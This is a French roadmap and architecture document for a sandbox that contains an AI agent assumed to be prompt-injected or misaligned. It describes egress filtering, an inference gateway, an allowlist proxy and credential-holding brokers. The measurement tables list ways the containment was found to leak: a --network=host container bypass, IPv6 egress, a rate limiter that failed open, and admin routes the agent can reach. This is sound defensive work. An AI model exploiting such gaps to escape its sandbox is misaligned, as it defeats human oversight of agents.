# 📋 Roadmap & Architecture — Sandbox d'agent IA

Document récapitulatif : état déployé, modèle de composants, et feuille de route **dans l'ordre d'implémentation**.

> **Ce projet est une sandbox générique et composable**, pas une solution pour un cas d'usage particulier. Le socle (contrôle d'egress + gateway d'inférence) est toujours déployé ; le proxy L7 est la brique d'adaptation ; les brokers (Kubernetes, git) sont des **extensions optionnelles** ; et le harnais s'installe **en dernier**, une fois la sandbox prête. Voir §2.

---

## 🎯 0. Principes directeurs

### Objectif du projet

Fournir une **sandbox d'exécution pour agent IA**, réutilisable et opensourcable, avec trois propriétés non négociables :

1. **Harness-agnostic.** Hermes, OpenClaw, Smolagents, ou n'importe quoi d'autre. Le socle ne présuppose rien du harnais : il sécurise l'environnement d'exécution autour de lui, et l'installation est un **provider interchangeable**. `harness_name` est une variable (déjà propagée partout, ex. `podman_gvisor_harness_name: "{{ harness_name | default('hermes') }}"`). Aucun chemin, nom d'unité ou utilisateur ne doit être codé en dur.
2. **Composable.** Chaque capacité est un rôle activable par un flag, dans le style existant (`gvisor_enabled`, `ollama_enabled`, `security_hardening_*_enabled`). Rien d'obligatoire au-delà du socle.
3. **Sans spécificité de déploiement.** Aucune valeur propre à une installation dans le code ou la doc : hôtes, IP, modèles, providers, allowlists, entrypoints et clés sont des variables. Un utilisateur doit pouvoir déployer sans modifier un template.

> **Le projet livre des implémentations, pas seulement des abstractions.** Exactement comme `ollama` est *une* implémentation possible de l'inférence (derrière la table d'alias du gateway), le projet **livrera un** provider d'installation de harnais (`harness_provider: hermes`), à créer en Phase 8. C'est une commodité assumée, pas une entorse au principe : le socle reste agnostique, et supporter un autre harnais consiste à ajouter un rôle provider — le chemin prévu, documenté en Phase 8.

### Ce que la sécurité doit réellement protéger

Le durcissement système actuel (SSH, fail2ban, auditd, AppArmor, sysctl, gVisor) protège bien **la VM**. Ce n'est pas là qu'est le risque principal.

La menace réelle : **le LLM est manipulé** (injection de prompt via du contenu non fiable, ou mésalignement) et utilise **ses propres pouvoirs légitimes**. Un agent injecté n'a pas besoin de s'échapper d'un conteneur — il a un shell et un accès réseau. Le durcissement système n'y répond pas ; la **limitation des pouvoirs** si.

### Les deux invariants

1. **Pas de droit d'application.** L'agent peut *proposer*, jamais *appliquer*. En GitOps, une branche ne déploie rien : le dommage exige un merge, et le merge est un geste humain. La protection de branche côté forge est le contrôle porteur.
2. **Aucun credential dans la zone où le modèle s'exécute.** Règle générale de composition :

> **Un composant vit dans la zone agent tant qu'il ne détient aucun secret. Dès qu'il en détient un, il rejoint la zone de confiance** — utilisateur système dédié, sans droits, qui n'exécute jamais de code produit par le modèle.

C'est cette règle qui rend le broker optionnel : s'il n'y a aucun secret à détenir, il n'y a pas de zone de confiance à déployer.

### Corrections de cadre (affirmations fausses du README/TODO actuel)

| Affirmation | Réalité |
|---|---|
| Le diagramme montre l'agent *dans* gVisor | gVisor (`runsc`) est le runtime **des conteneurs que l'agent lance** (`podman run`). Le processus agent tourne **nu** sur la VM. Rien ne le contraint aujourd'hui. |
| « Bloquer l'egress via UFW pour l'utilisateur de l'agent » | **UFW ne filtre pas par utilisateur** — il n'expose pas le match `owner`. Ça se fait en nftables (`meta skuid`) ou via `before.rules` (Phase 1). |
| « Le fournisseur d'inférence lié à `127.0.0.1` empêche l'exposition réseau » | Vrai pour l'**entrée**. Si le provider route vers un service distant, la sortie dépend du contrôle d'egress (Phase 1 → Phase 3). Le projet doit rendre les deux cas possibles. |
| Une allowlist git filtrée par méthode HTTP | `git clone` **et** `git push` sont tous deux des `POST` (`git-upload-pack` / `git-receive-pack`). Lecture/écriture se distinguent par le **chemin**, pas par la méthode. |

### Arbitrages documentés (génériques)

À ne pas re-litiger sans raison nouvelle. Laissés à l'appréciation de l'utilisateur, pas verrouillés par le projet.

- **Généricité de l'egress.** Un broker est spécifique à un cas d'usage ; un proxy à allowlist configurable est le primitif qui permet à **n'importe quel** déploiement de déclarer sa politique sans écrire de code. Les deux coexistent : le réseau (Phase 1) est le socle, le proxy (Phase 3) est la couche d'adaptation, les brokers (Phases 4-5) sont les intégrations étroites.
- **Inférence distante.** Si le provider est distant (API), le contenu des prompts sort du périmètre : la *destination* est filtrable par le proxy (niveau 1), le *contenu* ne l'est qu'avec interception TLS (niveau 2). Le projet ne l'interdit ni ne le favorise.
- **Une seule VM.** La frontière interne entre les deux zones est faible (même noyau). Acceptable tant qu'aucun secret d'infrastructure n'entre en jeu.
- **Jeton de forge injecté par proxy.** Jamais dans l'espace d'adressage du harnais, jamais dans son environnement. Le bornage vient de la protection de branche, pas du proxy.

- **Où vit un credential : chez qui peut le frapper.** Un jeton de ServiceAccount est frappé par le cluster — un coffre ne peut en être que le second domicile, et le livrer supposerait que la VM lise un Secret k8s, donc de percer le contrôle que le broker est censé fermer (Phase 4). Un mot de passe de base ou une clé d'API, c'est le déploiement qui les écrit : le coffre en est la source, et ESO les matérialise dans le cluster. Entre les deux, ce qui est frappé **une fois puis illisible** (un PAT de forge) : la seule copie restante est celle du déploiement, donc le coffre y est à sa place (Phase 5). La consommation est un axe séparé : le domicile se choisit à la source, la livraison dépend du consommateur.

---

## 🏗️ 1. État déployé

Le socle d'isolation multi-couches est en place. **« Déployé » ne veut pas dire « vérifié »** : aucun contrôle automatisé n'atteste l'état réel aujourd'hui — c'est l'objet de la Phase 7. (Le contrôle d'egress de la Phase 1 a été vérifié à la main, mesures à l'appui, mais rien ne l'atteste automatiquement : c'est exactement ce que la Phase 7 doit combler.)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  Proxmox VE (KVM Isolation + QEMU Guest Agent + Virtio-RNG)                  │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  VM Ubuntu Server (UFW Rate-Limit + Fail2ban + Auto-Upgrades)          │  │
│  │                                                                        │  │
│  │   ZONE AGENT — NON FIABLE        uid={{ harness_name }} (0750)         │  │
│  │   • Harnais IA (processus nu, PAS dans gVisor) — installé en Phase 8   │  │
│  │   • Sudoers restreint : restart uniquement · limits.d anti-DoS         │  │
│  │   • Python via uv · Node.js via NVM · Docker/Compose compat            │  │
│  │   • Aucun credential (cible) · egress : loopback seul (fait, Ph. 1)    │  │
│  │   ┌───────────────────────────────────────────────────────────────┐   │  │
│  │   │  gVisor (runsc) — runtime OCI par défaut                       │   │  │
│  │   │  Sandbox des conteneurs LANCÉS PAR l'agent, pas de l'agent     │   │  │
│  │   └───────────────────────────────────────────────────────────────┘   │  │
│  │                                                                        │  │
│  │   ZONE DE CONFIANCE   uid={{ broker_name }} (0700, nologin)            │  │
│  │   Tout composant qui détient un secret. N'exécute jamais de code       │  │
│  │   produit par le modèle.                                               │  │
│  │   • Gateway d'inférence  → provider, clé détenue (fait, Ph. 2)         │  │
│  │   • Proxy egress L7      → internet, allowlist (fait, Ph. 3)           │  │
│  │   • Broker Kubernetes    → kube-apiserver, jeton RO (fait, Ph. 4)      │  │
│  │   • Broker git           → forge, token injecté (Phase 5)              │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

Le proxy L7 est la **brique d'adaptation** : elle permet de déclarer une politique d'egress par déploiement, sans écrire de code — ce qui est nécessaire pour couvrir des cas d'agent hétérogènes.

### Protections déjà actives

1. **Provisioning Proxmox (OpenTofu)** : Cloud-Init, GPU/PCI Passthrough, `qemu-guest-agent`, Virtio-RNG.
2. **Isolation noyau (gVisor)** : conteneurs dans le micro-noyau `4.19.0-gvisor`.
3. **Hardening SSH** : mot de passe désactivé, root interdit, `AllowUsers` strict, crypto post-quantique, `AllowTcpForwarding no`, `AllowAgentForwarding no`.
4. **Hardening Kernel & OS** : ASLR complet, `yama.ptrace_scope=1`, anti-DoS réseau, anti-spoofing, core dumps désactivés, blacklist `dccp`/`sctp`/`rds`/`tipc`/`firewire`, umask `027`.
5. **Surveillance** : fail2ban + action UFW, `unattended-upgrades` + `apt-daily.timer`, auditd, AppArmor enforce, `libpam-pwquality`.
6. **Utilisateur harnais** : non-root, home `0750`, linger systemd. Le sudoers scopé (`systemctl restart`) référence une unité qui n'existe qu'à partir de la Phase 8.
7. **Egress de la zone agent** : filtré par uid (table nftables `agent_egress`, chargée par `agent-egress.service`) — loopback seul, résolution de noms comprise, conteneurs couverts. Appliqué en dernier rôle du play ; voir Phase 1 pour l'ordre et la fenêtre assumée.
8. **Gateway d'inférence** (`inference-gateway.service`) : porte d'entrée loopback portée par la **zone de confiance** (`broker`), table d'alias obligatoire — l'agent nomme un rôle, jamais un modèle du provider — et clé du provider détenue par le gateway. Le port amont du provider est fermé à la zone agent, donc le gateway est le seul chemin vers un modèle.
9. **Proxy egress L7** (`egress-proxy.service`, `agent_egress_proxy_enabled`) : la **seule** sortie de la zone agent vers le web, allowlist déclarée par le déploiement, destinations internes refusées, une ligne de journal par requête. Le niveau 1 ne demande aucune CA ; le niveau 2 (interception TLS, opt-in) ajoute les chemins et l'inspection au prix de la distribution d'une CA interne.
10. **Broker Kubernetes** (`k8s-broker.service`, `k8s_broker_enabled`) : le **seul** chemin de la zone agent vers un cluster, sous forme de `kubectl proxy` loopback porté par la zone de confiance, alimenté par un kubeconfig de ServiceAccount en lecture seule qui n'entre jamais dans la zone agent. L'agent reçoit une adresse (`127.0.0.1:8001`) et un `token: ignore` ; les méthodes d'écriture et les chemins `exec`/`attach`/`portforward`/`secrets` sont refusés par le proxy, et le jeton n'a aucun verbe d'écriture.

---

## 🧩 2. Modèle de composants

Chaque composant est un rôle activable, dans le style existant.

| Composant | Rôle | Flag | Requis |
|---|---|---|---|
| Contrôle de l'egress par uid | `agent_egress` | `agent_egress_filter_enabled` | **Socle** |
| Gateway d'inférence | `inference_gateway` | `inference_gateway_enabled` | **Socle** |
| Provider d'inférence local (Ollama) | `ollama` *(existant)* | `ollama_enabled` | Optionnel |
| Proxy egress L7 (niveau 1 : allowlist) | `agent_egress_proxy` | `agent_egress_proxy_enabled` | Brique d'adaptation |
| Inspection TLS (niveau 2) | `agent_egress_proxy` *(même rôle)* | `agent_egress_proxy_tls_intercept` | Opt-in |
| Broker Kubernetes (lecture seule) | `k8s_broker` | `k8s_broker_enabled` | Extension |
| Broker git (propositions de PR) | `git_broker` | `git_broker_enabled` | Extension |
| Installation du harnais (provider livré) | `harness_hermes` | `harness_provider: hermes` | Phase 8, **à créer** |
| Sécurisation du harnais (unité systemd) | `harness_service` | `harness_service_enabled` | Phase 8 |
| Zone de confiance (utilisateur système) | `trust_zone` | `trust_zone_enabled` | Dépendance du gateway et des brokers |

**Exemples d'assemblages visés :**

- *Agent conversationnel* : zone agent + conteneurs + gateway d'inférence.
- *Agent avec navigation web* : socle + proxy L7 niveau 1, allowlist déclarée par le déploiement.
- *Agent SRE k3s* : socle + `k8s_broker` + `git_broker`.
- *Agent avec API d'inférence distante* : socle, la clé restant dans la zone de confiance.

### Variables (conventions existantes)

```yaml
# --- Harnais (existant, agnostique) ---
harness_name: "hermes"              # hermes, openclaw, smolagents, ...
# L'entrypoint est la seule chose à renseigner côté harnais (Phase 8) :
# harness_exec_start: "/usr/local/bin/uv run python main.py"

# --- Socle ---
agent_egress_filter_enabled: true   # filtre l'egress de la zone agent (loopback seul)

# --- Zone de confiance ---
broker_name: "broker"               # utilisateur système ; tout composant qui détient un secret

# --- Inférence : le provider est un choix de l'utilisateur ---
inference_gateway_enabled: true
inference_gateway_port: 4000
inference_gateway_upstream_url: "http://127.0.0.1:11434"  # amont local ; son port est fermé à l'agent
# Table d'alias obligatoire : alias vu par l'agent -> modèle réel du provider. Le préfixe
# choisit l'endpoint amont (ollama_chat/ pour le chat, ollama/ pour les embeddings).
inference_gateway_models:
  - alias: reasoning
    model: "ollama_chat/<modèle-de-raisonnement>"
#   - alias: reasoning
#     model: "deepseek/<modèle>"      # la clé est détenue par le gateway, jamais par le harnais
#     api_key: "<clé>"
inference_gateway_debug_logging: false  # flux de débogage, pas une piste d'audit

# --- Proxy egress L7 (brique d'adaptation) ---
agent_egress_proxy_enabled: false       # false : la zone agent n'a aucun egress web
agent_egress_proxy_port: 8080
# [.]hôte[:port][/chemin] : point initial = sous-domaines, sans port = 80 et 443, chemin = niveau 2.
agent_egress_proxy_allowlist: []
agent_egress_proxy_tls_intercept: false # niveau 2 : interception TLS (CA interne, cert pinning cassé)

# --- Extensions optionnelles ---
k8s_broker_enabled: false           # broker Kubernetes en lecture seule, porté par la zone de confiance
k8s_broker_port: 8001
# Kubeconfig du ServiceAccount : un secret, donc un fichier hors dépôt, pas une variable.
k8s_broker_kubeconfig_src: "{{ inventory_dir }}/../files/k8s-broker.kubeconfig"
git_broker_enabled: false

# --- Harnais (Phase 8) : installation (provider) puis sécurisation ---
harness_provider: "hermes"          # "hermes" (rôle livré) ou "none" (installation manuelle)
# harness_exec_start: "..."         # prioritaire sur le défaut du provider
harness_service_enabled: true
```

> **Pourquoi `agent_egress_proxy_enabled: false` par défaut.** La Phase 1 laisse déjà la zone agent sans aucun egress hors loopback. Le socle donne donc l'accès à l'inférence *via le gateway* (loopback) sans ouvrir le réseau. L'egress web est un **opt-in explicite** : c'est le déploiement qui décide de sa politique, pas le projet.

---

## 🗺️ 3. Feuille de route

### Socle

#### ✅ Phase 0 — Corrections documentaires *(faite)*

- [x] Corriger les quatre affirmations du §0 dans le README et ce TODO.
- [x] Retirer du README la roadmap obsolète (« L7 Egress Proxy, Zero-Secret credential injection ») et la remplacer par le renvoi à §2.
- [x] Vérifier qu'aucune valeur propre à un déploiement ne figure dans les templates ou la doc.
  - **Corrigé** : `ollama_models` livrait `kimi-k2.7-code:cloud` (README + `all.yml.example`) → petit modèle local par défaut, les modèles distants passent en commentaire.
  - **Corrigé** : `variable "vm_config"` portait une topologie de VM **en défaut** (`vm-ai` sur `pve-node1`, `10.0.0.1/24`, `vlan_id 100`). Défaut supprimé → la variable devient requise ; la topologie vient de `terraform.tfvars`, où elle appartient.
  - **Laissé volontairement** : les IP d'exemple dans les `description` de `variables.tf` et dans `terraform.tfvars.example`. Un fichier d'exemple est fait pour ça, et ce ne sont pas des valeurs de déploiement réelles.

**Pourquoi en premier :** ces affirmations fausses créent un faux sentiment de sécurité — précisément ce qui fait qu'on ne met pas en place le contrôle qui manque.

#### ✅ Phase 1 — Contrôle de l'egress par uid *(faite)*

L'allowlist devient **structurelle** (topologie) au lieu d'être content-based : si la zone agent n'a pas de route, il n'y a rien à filtrer au L7. C'est le socle de la Phase 3.

**Ne dépend que de l'uid du harnais** (`harness_user` est déployé), pas de l'installation du harnais ni de son unité (Phase 8).

**Option A retenue** — table nftables dédiée, testable seule, indépendante d'UFW. UFW garde l'ingress et son propre OUTPUT ; les deux coexistent.

**Règles déployées.** Le snippet initial était incomplet sur trois points — IPv6, plages subuid, DNS — tous corrigés :

```nft
table inet agent_egress {
  chain output {
    type filter hook output priority -50; policy accept;

    # Aucune résolution de noms : le stub loopback relaie en amont sous son propre uid.
    meta skuid { <uids> } ip daddr 127.0.0.0/8 udp dport 53 counter drop
    meta skuid { <uids> } ip daddr 127.0.0.0/8 tcp dport 53 counter drop
    meta skuid { <uids> } ip6 daddr ::1 udp dport 53 counter drop
    meta skuid { <uids> } ip6 daddr ::1 tcp dport 53 counter drop

    # Loopback uniquement. Le `drop` a lieu dans le hook output local : l'émetteur
    # échoue immédiatement et rien ne fuit en réponse.
    # Le log throttlé est une règle SÉPARÉE : `limit` est un match, donc dans la
    # règle de drop il ferait sauter le drop au-delà du seuil (filtre ouvert).
    meta skuid { <uids> } ip daddr != 127.0.0.0/8 \
      limit rate 6/minute burst 12 packets log prefix "agent-egress-drop: "
    meta skuid { <uids> } ip daddr != 127.0.0.0/8 counter drop
    meta skuid { <uids> } ip6 daddr != ::1 counter drop
  }
}
```

`<uids>` = uid du harnais **+ ses plages subuid**, résolus à l'exécution (`id -u`, `/etc/subuid`) : l'uid n'est pas fixé par `harness_user`.

**Ce que les mesures ont établi** — plusieurs hypothèses sont tombées :

| Point | Résultat mesuré |
|---|---|
| Ordre des hooks | UFW est en `priority filter` (= 0) : le `drop` à `-50` passe avant et est **terminal**. UFW ne peut pas le court-circuiter. Vérifié. |
| Conteneurs (réseau propre) | Atteignent l'extérieur filtre levé, **timeout filtre actif** (A/B) : `meta skuid` couvre pasta/netavark. |
| Contournement `--network=host` | **Réel** : uid hôte mesuré **100999** (plage subuid), pas celui du harnais. Chemin mort avec `runsc` (défaut), mais **vivant avec `gvisor_default: false`** — et c'est l'inclusion subuid qui le bloque. |
| Latence | Résolution bloquée mesurée à **~0 s** : le `drop` en hook output fait échouer `sendto` immédiatement. Le « ~5 s » supposé était faux. |
| Limiteur de log | `limit` est un **match** : placé dans la règle de drop, il fait sauter le `drop` au-delà du seuil — le filtre échouait **ouvert**. Mesuré sous charge : **37 paquets sur 50 acceptés**. Le log throttlé est donc une règle à part, et le `drop` inconditionnel. |
| Volume de test | Le défaut ci-dessus est passé inaperçu parce que tous les tests étaient à faible volume, sous le seuil du limiteur. **Tout limiteur de débit doit être testé au-dessus de son seuil.** |
| IPv6 | `ip daddr` ne matche que l'IPv4 : sans `ip6 daddr != ::1`, l'agent sort par IPv6. |

**Ordre dans le play : `agent_egress` est le DERNIER rôle** ; les `pre_tasks` lèvent le filtre pour la durée du run.

- [x] **Pas de migration UFW → nftables** : UFW reste pour l'ingress (fail2ban dépend de son action), l'egress par uid s'ajoute à côté.
- [x] Uid **numériques** dans la conf finale.
- [x] `agent_egress_filter_enabled: false` retire table, unité et fichier (vérifié : egress de l'agent rouvert).
- [x] Interaction UFW ↔ nftables vérifiée empiriquement, **reboot compris**.
- [x] Persistance par `agent-egress.service` dédiée (`oneshot`, `Before=network.target`), **jamais `nftables.service`** : le `/etc/nftables.conf` stock commence par `flush ruleset` et effacerait UFW au boot.
- [x] `ExecStartPost` vérifie que la table est chargée : un échec ne peut pas laisser la zone ouverte en silence.

**Le piège qui a failli passer.** Une unité `oneshot` + `RemainAfterExit` reste « active » indéfiniment : la table détruite par la levée n'était **pas** réappliquée, pendant que `systemctl is-active` répondait `active`. Le rôle lit désormais **la table vivante**. Un contrôle de sécurité doit vérifier l'**effet**, pas l'état déclaré.

**Fenêtre assumée.** Un run qui échoue avant le dernier rôle laisse la zone agent ouverte jusqu'au run suivant — prix de ce choix, retenu parce que le provisioning installe `nvm`/`npm` **en tant que harnais** et a besoin du réseau. La Phase 7 **doit** donc asserter dans `make audit` que la table est chargée, sinon la fenêtre est indétectable.

**Suites.** Phase 3 : le blocage DNS **reste** — le résolveur en zone de confiance annoncé ici ne s'est pas révélé nécessaire, et la raison est écrite au §4. Phase 8 : l'unité du harnais devra déclarer `After=agent-egress.service` — la couche `IPAddressDeny` reste utile en complément, elle ne remplace pas ce rôle.

**Constaté au passage, non traité ici :**

- **Plages subuid/subgid dupliquées** : `hermes` en a deux, dont une **partagée avec `ubuntu`** — l'inclusion subuid filtre donc aussi ses conteneurs. À dédupliquer un jour, mais changer une plage subuid sur une machine avec du stockage conteneur impose un `chown` du store : décision à part.
- **`-e agent_egress_filter_enabled=false`** passe la *chaîne* `"false"`, qu'Ansible refuse comme conditionnel. Utiliser la forme JSON. Vaut pour tous les flags `*_enabled`.
- **`nvm` exécute `npm update -g` sans condition** à chaque run : c'est ce qui rend la levée du filtre nécessaire, et une surface de supply chain à revoir (Phase 6).
- **`sudo -u {{ harness_name }}` depuis `/home/ubuntu`** échoue (`0750` sur les deux homes) : préfixer par `cd /tmp` ou `-H`.

#### ✅ Phase 2 — Gateway d'inférence *(faite)*

Composant qui rend le **provider d'inférence interchangeable** et qui soustrait au harnais jusqu'au **nom** des modèles : l'agent demande un rôle (`reasoning`, `execution`), la table d'alias traduit vers le modèle réel. Changer de provider ne touche pas la configuration de l'agent.

Implémentation : **litellm** (`inference-gateway.service`), HTTP simple sur `127.0.0.1:4000`, sans CA ni interception TLS (niveau 2 = Phase 3).

- [x] Reverse proxy loopback, HTTP simple : le provider peut être local (Ollama) ou distant, et c'est le gateway qui fait le TLS amont.
- [x] **Clé du provider détenue par le gateway**, référencée en `os.environ/...` depuis un fichier d'environnement en `0600` : ni dans le config, ni dans un diff, ni dans l'espace du harnais.
- [x] **Table d'alias obligatoire** — alias vu par l'agent → modèle réel. Un modèle non déclaré est refusé en **400** (`ProxyModelNotFoundError`) : c'est une allowlist stricte, sans mécanisme séparé.
- [x] **Zone de confiance** : le gateway tourne sous `broker`, jamais sous l'uid du harnais, **même sans clé** — un seul chemin de code, et l'agent ne peut ni l'arrêter ni lire sa config.
- [x] **Port amont fermé à la zone agent** (`agent_egress_blocked_loopback_ports`, dérivé de `inference_gateway_upstream_url`) : sans ça l'agent appelle Ollama en direct et la table d'alias ne restreint rien.
- [x] `inference_gateway_enabled: false` retire unité, config et venv **et rouvre le port amont** (vérifié). Rebond après reboot et réversibilité vérifiés sur la VM.
- [x] Le rôle `ollama` existant reste **inchangé** : le gateway est une couche au-dessus, pas un remplacement.

**Deux pièges d'ordre, trouvés par les tests de réversibilité :**

- **`trust_zone` tourne avant ses dépendants**, donc au tear-down `userdel` échoue (« user broker is currently used by process N ») : le service du gateway tourne encore sous cet uid. Le rôle arrête donc les unités listées dans `trust_zone_dependent_units` avant de supprimer le compte — vérifié : plus aucun processus sous un uid supprimé après coup.
- **Zone désactivée alors que le gateway la réclame** : le play échoue **proprement**, avec un message qui dit quoi faire (`trust_zone_enabled`, ou `inference_gateway_user`). Un échec bruyant vaut mieux qu'une unité déployée avec un `User=` inexistant.

**Ce que les mesures ont établi** — trois leviers supposés se sont révélés **inertes**, et c'est le genre d'erreur qui ne se voit pas à l'œil nu :

| Point | Résultat mesuré |
|---|---|
| Préfixe du provider | `ollama_chat/` frappe `/api/chat` (tool calling) ; `ollama/` frappe `/api/generate` — et **l'endpoint embeddings n'est mappé que pour `ollama/`**. Un préfixe unique ne peut donc pas servir un modèle de chat **et** un modèle d'embedding : le préfixe se déclare **par alias**. Constaté en 400 « Unmapped LLM provider for this endpoint ». |
| Quotas `rpm`/`tpm` | **Non appliqués** : 80 requêtes parallèles, 80 × 200. Ce sont des entrées de *routage*, pas un limiteur. |
| `max_parallel_requests` + `enable_pre_call_checks` | **Non appliqués** : 6 concurrentes passées pour une limite de 4. |
| `global_max_parallel_requests` | **Non appliqué** : 6 concurrentes pour une limite de 3. |
| `turn_off_message_logging` | Rien de visible ; `DETAILED_DEBUG` journalise bien le prompt (**5 occurrences**), mais au prix de **135 lignes de journal pour une seule requête** d'embedding. Flux de débogage, pas piste d'audit → le flag porte son vrai nom. |
| Interpréteur du venv | `uv` installe CPython sous **`/root`**, hors de portée de `broker` — et `ProtectHome=true` masque `/root` de toute façon. Le venv reste **root-owned** pour que le service ne puisse pas réécrire le code qu'il exécute (`ProtectSystem=strict`) : `UV_PYTHON_INSTALL_DIR` déplace l'interpréteur, et le groupe donne la lecture seule. |

**Ordre dans le play** : `trust_zone` puis `inference_gateway`, après `ollama` et avant `agent_egress` qui reste **dernier**.

**Corrigé après une review externe :** `api_base` n'est plus appliqué qu'aux modèles du provider **local** (`ollama`/`ollama_chat`) — un modèle distant partait sinon vers l'URL locale d'Ollama ; les règles de blocage du port amont couvrent désormais **IPv6** (`ip6 daddr ::1`, compteur vérifié à 4 paquets) alors que la leçon IPv6 de la Phase 1 n'y avait pas été appliquée ; un **pré-vol** dans `pre_tasks` valide la table d'alias **avant** la levée du filtre, pour qu'un run voué à l'échec n'ouvre pas la zone agent ; `broker_name == harness_name` est refusé (les deux zones fusionneraient sous un uid).

**Deux points de cette review ont été rejetés, mesures à l'appui** — à ne pas re-litiger sans fait nouveau :

| Point | Ce qui a été mesuré |
|---|---|
| Entourer les clés de guillemets dans `gateway.env` (« un `#` interne serait vu comme un commentaire ») | **Faux** : `PLAIN=ab#cd ef` se charge en `[ab#cd ef]`. Et la correction **dégraderait** le cas réel : un espace de fin collé avec la clé est supprimé sans guillemets (`[abc]`) mais **préservé** avec (`[abc ]`), ce qui casserait l'authentification. |
| Conditionner le chown récursif du venv à la version installée (« 30-60 s par run ») | **2,05 s** mesurées pour **20 018 fichiers**. Et le gating rouvrirait le trou « groupe changé, version inchangée » : `broker_name` modifié → accès perdu sans que rien ne le signale. |

**Défaut trouvé en corrigeant :** `.version` était écrit **après** le chown récursif, donc le run suivant devait rattraper — idempotence décalée d'un run à chaque changement de version. Le chown est désormais la dernière étape du bloc.

**Ce qui reste dehors, et pourquoi :**

- **Ordre canonique du préfixe** et **compression de la partie volatile** : ce sont des contrats du **harnais** — c'est le client qui construit la requête. Un proxy qui réécrit le contenu envoyé est un piège de débogage. À documenter en Phase 8, pas à implémenter ici.
- **Quotas de tokens** : litellm ne les applique pas sans Redis (suivi d'usage) ni base de données (budgets, clés virtuelles). Ce serait un composant de plus, avec son propre secret, pour une borne que la Phase 7 peut obtenir par l'observation. Décision : **pas de quota**, mesures ci-dessus à l'appui.
- **Redaction** : `turn_off_message_logging: true` est le défaut, mais aucun callback n'est configuré — c'est une protection **prospective**, pas un contrôle actif. Dit tel quel plutôt que présenté comme acquis.

**Trouvaille à traiter en Phase 7.** Les routes d'administration de litellm sont sur le loopback, donc **joignables par l'agent** (`/health`, `/metrics`, `/key/*`). Sans base de données, `model_list` n'est pas modifiable à chaud et la clé du provider n'est jamais renvoyée : l'impact est faible, mais c'est un chemin que l'agent a et que `make audit` doit connaître. L'UI d'admin est désactivée.

### Brique d'adaptation

#### ✅ Phase 3 — Proxy egress L7 *(faite)*

**Pourquoi cette brique dans un projet générique.** On ne peut pas prédire ce dont chaque harnais a besoin. Un broker est spécifique à un cas d'usage (Kubernetes, git) ; un proxy à allowlist configurable est le primitif qui permet à **n'importe quel** déploiement de déclarer sa politique d'egress **sans écrire de code**. C'est ce qui rend le projet capable de protéger des cas d'agent hétérogènes.

Implémentation : **mitmproxy 12.2.3** (`mitmdump`, mode *regular*), `egress-proxy.service`, HTTP sur `127.0.0.1:8080`, sous l'utilisateur de la zone de confiance. Deux niveaux, activables séparément — leur coût n'a rien à voir :

| | Niveau 1 — défaut | Niveau 2 — `_tls_intercept: true` |
|---|---|---|
| Politique | destination (hôte, port) | destination **et** chemin |
| TLS | passé à travers, **jamais terminé** | terminé avec une CA interne |
| CA | **aucune**, rien à distribuer | store système + env Python/Node ; le pinning casse |
| Journal | destination, décision | idem, plus méthode, chemin, statut |

- [x] **Un seul outil pour les deux niveaux** : le même `mitmdump` — `ignore_hosts: .*` pour le niveau 1 (TLS brut), interception au niveau 2. Squid/tinyproxy écartés : ils auraient ajouté un second composant pour le niveau 2.
- [x] **Refuser les destinations internes** : RFC1918, loopback, lien-local, multicast, CGNAT — pour une **IP littérale comme pour un nom résolu**, la résolution ayant lieu *avant* l'ouverture de la connexion. Un domaine autorisé qui pointerait vers le LAN défairait sinon la Phase 1. Une résolution qui échoue refuse.
- [x] **Journaliser chaque requête** : une ligne de politique (`egress-allow: hôte:port`, `egress-deny: <raison> hôte:port`) — aucun corps, jamais. La raison distingue `internal`, `not-allowlisted`, `malformed`. C'est la matière de la Phase 7.
- [x] `agent_egress_proxy_tls_intercept: false` par défaut ; le coût du niveau 2 est dit **avant** de l'activer (README + `all.yml.example`) : CA à distribuer partout, pinning cassé.
- [x] **Fail-closed vérifié** : proxy arrêté, la zone agent n'a plus **aucun** egress et ne bascule pas en direct.
- [x] **Zone de confiance, aux deux niveaux** : le proxy tourne sous `broker`, jamais sous l'uid du harnais — pas seulement par la règle du §0, mais parce que le filtre coupe tout egress non-loopback de l'uid du harnais : un proxy sous cet uid ne pourrait pas sortir. La phrase du §3 d'origine (« le niveau 1 peut rester hors zone de confiance ») était donc **fausse**, et activer le proxy implique `trust_zone_enabled`.
- [x] **Egress du proxy : rien à ajouter à la Phase 1** — confirmé : UFW sort en `ACCEPT` et l'uid de la zone de confiance n'est pas filtré.
- [ ] Quotas / rate-limits par destination : **écarté**, décision utilisateur — l'alerte sur volume anormal (Phase 7) couvre le cas, et le proxy n'est pas le bon endroit pour tenir un état d'usage.
- Le proxy **résout lui-même** les noms : la zone agent n'a besoin d'aucun DNS, et son blocage du port 53 reste donc entier.
- [x] **`*` — « tout l'internet, sauf interne »** : une entrée `*` autorise n'importe quel **hôte public**, sur 80 et 443 (`*:8443` pour un autre port — `*` n'ouvre pas tous les ports). C'est le besoin d'un agent de recherche, qui doit sortir partout mais ne doit pas voir le LAN — et le refus des destinations internes, qui reste, est justement le contrôle qui tient. Ce que ça coûte, et c'est consigné : le contrôle **par destination** disparaît (par construction), et **le canal DNS se rouvre** — chaque nom étant légitime, chaque nom est résolu, alors qu'un nom hors allowlist est refusé aujourd'hui sans jamais être résolu.

**Ce que les mesures ont établi** — les pièges qui ne se voient pas à l'œil nu :

| Point | Résultat mesuré |
|---|---|
| `@dataclass` dans un script mitmproxy | **Ne fonctionne pas** : le chargeur de scripts n'enregistre pas le module dans `sys.modules`, et `dataclasses._is_type` s'y appuie → `AttributeError` à l'import, service en échec de démarrage. Classe simple. |
| Journal du service | **Rien n'arrivait dans le journal** alors que le service traitait les requêtes : mitmproxy journalise sur **stdout**, bufferisé en bloc hors terminal. `PYTHONUNBUFFERED=1` dans l'unité — vérifié, les lignes arrivent en temps réel. Sans ça, la piste d'audit de la Phase 7 serait arrivée par paquets et perdue au crash. |
| Ordre CONNECT ↔ décision | `HttpConnectHook` est émis **avant** la construction de la couche suivante, et une réponse non-2xx coupe le tunnel **sans ouvrir de connexion amont** (vérifié dans la source, puis en 403 réel). Le refus est donc une décision, pas une coupure après coup. |
| Niveau 1 sans CA | `ignore_hosts: .*` suffit : `openssl s_client -proxy … -connect example.com:443` présente l'**émetteur réel** du site (vérifié), donc aucun certificat à distribuer. La décision d'ignorance lit `context.server.address`, absente sur la connexion cliente initiale : la couche HTTP est bien créée et le CONNECT lu. |
